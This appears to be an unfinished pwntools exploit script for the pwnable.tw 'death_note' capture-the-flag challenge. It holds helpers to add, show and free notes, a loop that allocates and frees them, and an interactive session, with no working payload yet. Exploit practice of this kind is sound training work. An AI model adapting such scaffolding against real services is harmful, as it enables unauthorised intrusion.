
#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("death_note")
#libc = ELF("./libc.so.6")
#ld = ELF("./ld-2.27.so")

local = True 
if local:
    p = process("./death_note")
    gdb.attach(p,'''c''')
else:
    p = remote('chall.pwnable.tw', 10001)

elf = context.binary = ELF('./death_note', checksec=False)

def add(idx, data):
    p.sendlineafter(b" :", b"1")
    p.sendafter(b" :", str(idx))
    p.sendlineafter(b" :", data)
    print("=========== ADD_NOTE ===========")
    print(data)

def show(idx):
    p.sendlineafter(b" :", b"2")
    p.sendafter(b" :", str(idx))

def free(idx):
    p.sendlineafter(b" :", b"3")
    p.sendafter(b" :", str(idx))
    print("=========== DEL_NOTE " + str(i) + " ===========")

note_ptr = 0x804a060

for i in range(9):
    add(i, str(i)*0x40)
    

for i in range(8):
   free(i)

add(8, b"A"*0x50)
#show(8)


p.interactive()